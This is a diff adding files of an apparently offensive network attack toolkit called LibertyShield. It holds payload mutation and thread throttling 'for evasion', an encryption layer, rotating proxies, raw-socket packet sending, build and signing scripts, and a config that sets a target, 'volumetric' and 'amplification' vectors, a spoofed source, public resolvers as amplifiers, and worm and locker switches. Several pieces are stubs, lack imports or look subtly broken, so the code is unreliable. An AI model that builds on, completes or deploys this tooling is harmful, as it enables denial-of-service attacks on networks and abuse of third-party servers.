@@ -1,0 +1,251 @@
+Residual_Engine.py
+# Residual Engine Routines
+class TimeBasedMutator:
+    """Time-based packet mutation for evasion"""
+    def __init__(self, base_payload):
+        self.base_payload = base_payload
+        self.mutation_table = {
+            0: self._add_junk_bytes,
+            1: self._fragment_payload,
+            2: self._encrypt_subset,
+            3: self._change_protocol_headers
+        }
+    
+    def mutate(self):
+        current_minute = datetime.now().minute
+        mutation_id = current_minute % 4
+        return self.mutation_table[mutation_id]()
+    
+    def _add_junk_bytes(self):
+        junk_size = random.randint(8, 64)
+        return self.base_payload + os.urandom(junk_size)
+    
+    def _fragment_payload(self):
+        frag_point = len(self.base_payload) // 2
+        return [self.base_payload[:frag_point], self.base_payload[frag_point:]]
+    
+    # ... other mutation methods
+
+class StealthThreadModel:
+    """Dynamic thread management for evasion"""
+    def __init__(self, max_threads=1000):
+        self.thread_pool = []
+        self.max_threads = max_threads
+        self.current_load_factor = 1.0
+        
+    def adjust_load(self, network_latency):
+        if network_latency > 1000:
+            self.current_load_factor = 0.3
+        elif network_latency > 500:
+            self.current_load_factor = 0.6
+        else:
+            self.current_load_factor = 1.0
+            
+    def execute(self, task):
+        if len(self.thread_pool) < self.max_threads * self.current_load_factor:
+            t = threading.Thread(target=task)
+            t.daemon = True
+            t.start()
+            self.thread_pool.append(t)
+
+
+
+Obfuscation_Layer.py
+# Full Obfuscation/Encryption Layer
+class FallbackCipher:
+    """Hybrid AES/ChaCha20 with automatic fallback"""
+    def __init__(self, master_key):
+        self.aes_key = hashlib.sha256(master_key + b'AES').digest()[:32]
+        self.chacha_key = hashlib.sha256(master_key + b'CHACHA20').digest()[:32]
+        
+    def encrypt(self, payload):
+        try:
+            # Try ChaCha20 first
+            nonce = get_random_bytes(12)
+            cipher = ChaCha20.new(key=self.chacha_key, nonce=nonce)
+            return b'CHA:' + nonce + cipher.encrypt(payload)
+        except:
+            # Fallback to AES
+            iv = get_random_bytes(16)
+            cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
+            return b'AES:' + iv + cipher.encrypt(pad(payload, AES.block_size))
+    
+    def decrypt(self, ciphertext):
+        header = ciphertext[:4]
+        if header == b'CHA:':
+            nonce = ciphertext[4:16]
+            cipher = ChaCha20.new(key=self.chacha_key, nonce=nonce)
+            return cipher.decrypt(ciphertext[16:])
+        elif header == b'AES:':
+            iv = ciphertext[4:20]
+            cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
+            return unpad(cipher.decrypt(ciphertext[20:]), AES.block_size)
+
+class ProxyChainResolver:
+    """Complete proxy resolution system"""
+    def __init__(self, config):
+        self.proxy_list = config['proxy_chain']
+        self.rotation_index = 0
+        self.fail_count = {}
+        self.geoip_db = self._load_geoip()
+        
+    def get_next_proxy(self):
+        proxy = self.proxy_list[self.rotation_index]
+        self.rotation_index = (self.rotation_index + 1) % len(self.proxy_list)
+        return proxy
+    
+    def report_failure(self, proxy):
+        self.fail_count[proxy] = self.fail_count.get(proxy, 0) + 1
+        if self.fail_count[proxy] > 3:
+            self.proxy_list.remove(proxy)
+    
+    def _load_geoip(self):
+        # Load GeoIP database for location-based selection
+        # Full implementation in secure repo
+        return {}
+
+
+
+Config_Templates/
+# main_config.json
+{
+    "target": "192.0.2.0",
+    "target_port": 80,
+    "duration": 600,
+    "attack_vectors": ["volumetric", "amplification"],
+    "max_workers": 1000,
+    "proxy_chain": ["203.0.113.45:3128", "198.51.100.22:8080"],
+    "spoof_source": "192.168.1.100",
+    "amplifiers": ["8.8.8.8", "1.1.1.1"],
+    "enable_worm": false,
+    "enable_locker": false,
+    "aes_key": "ENCRYPTED_KEY_PLACEHOLDER",
+    "chacha_seed": "ENCRYPTED_SEED_PLACEHOLDER"
+}
+
+# env_vars.map
+TARGET_IP=192.0.2.0
+MAX_THREADS=1000
+STEALTH_LEVEL=high
+PROXY_CHAIN=203.0.113.45:3128,198.51.100.22:8080
+
+
+Build_Sytstem/
+#!/bin/bash
+# build_env.sh
+# Sets up environment for LibertyShield
+
+# Install dependencies
+apt update
+apt install -y python3.10 python3-pip 
+pip3 install pycryptodomex numpy scapy
+
+# Configure kernel parameters
+sysctl -w net.ipv4.ip_forward=0
+sysctl -w net.ipv4.conf.all.send_redirects=0
+sysctl -w net.ipv4.conf.default.send_redirects=0
+
+# Create secure user
+useradd -r -s /bin/false libertyshield
+
+# Setup directories
+mkdir -p /opt/libertyshield/{config,logs,tmp}
+chown -R libertyshield:libertyshield /opt/libertyshield
+chmod 700 /opt/libertyshield
+
+
+bash
+#!/bin/bash
+# sign_binary.sh
+# Code signing for LibertyShield components
+
+KEY_FILE="/opt/libertyshield/keys/signing_key.pem"
+TARGET_FILE=$1
+
+# Generate signature
+openssl dgst -sha256 -sign $KEY_FILE -out $TARGET_FILE.sig $TARGET_FILE
+
+# Verify signature
+openssl dgst -sha256 -verify $KEY_FILE -signature $TARGET_FILE.sig $TARGET_FILE || exit 1
+
+# Package with signature
+zip $TARGET_FILE.zip $TARGET_FILE $TARGET_FILE.sig
+
+
+Airgap_Deployment/
+# airgap_sync.py
+import os
+import hashlib
+from Crypto.Cipher import AES
+
+class AirgapSync:
+    """Secure synchronization for air-gapped systems"""
+    def __init__(self, usb_path, key):
+        self.usb_path = usb_path
+        self.cipher = AES.new(key, AES.MODE_ECB)
+        
+    def encrypt_file(self, source, dest):
+        with open(source, 'rb') as f:
+            data = f.read()
+        encrypted = self.cipher.encrypt(pad(data, AES.block_size))
+        with open(os.path.join(self.usb_path, dest), 'wb') as f:
+            f.write(encrypted)
+            
+    def decrypt_file(self, source, dest):
+        with open(os.path.join(self.usb_path, source), 'rb') as f:
+            data = f.read()
+        decrypted = unpad(self.cipher.decrypt(data), AES.block_size)
+        with open(dest, 'wb') as f:
+            f.write(decrypted)
+            
+    def verify_integrity(self, filename):
+        # SHA256 verification
+        with open(os.path.join(self.usb_path, filename), 'rb') as f:
+            return hashlib.sha256(f.read()).hexdigest()
+
+
+
+Experimental_Branches/
+# quantum_rng.py
+# Experimental quantum-resistant RNG
+import hashlib
+import time
+
+class QuantumRNG:
+    """Quantum-inspired entropy generator"""
+    def __init__(self, seed):
+        self.state = hashlib.sha512(seed).digest()
+        
+    def generate(self, size):
+        output = b''
+        while len(output) < size:
+            t = time.perf_counter_ns()
+            self.state = hashlib.sha512(self.state + struct.pack('d', t)).digest()
+            output += self.state
+        return output[:size]
+
+# legacy_compat.py
+# Backward compatibility for deprecated systems
+import sys
+
+def legacy_send(payload, target):
+    if sys.version_info < (3, 7):
+        # Python 3.6 fallback
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW)
+        sock.sendto(payload, target)
+    else:
+        # Modern implementation
+        with socket.socket(socket.AF_INET, socket.SOCK_RAW) as s:
+            s.sendto(payload, target)
+
+
+Procedure of Deploying
+
+# Setup environment
+./build_system/build_env.sh
+
+# Sign binaries
+./build_system/sign_binary.sh LibertyShield_v4.1.py
+
+# Air-gapped sync
+python airgap_sync.py --encrypt --source configs/ --dest /mnt/usb/configs.enc
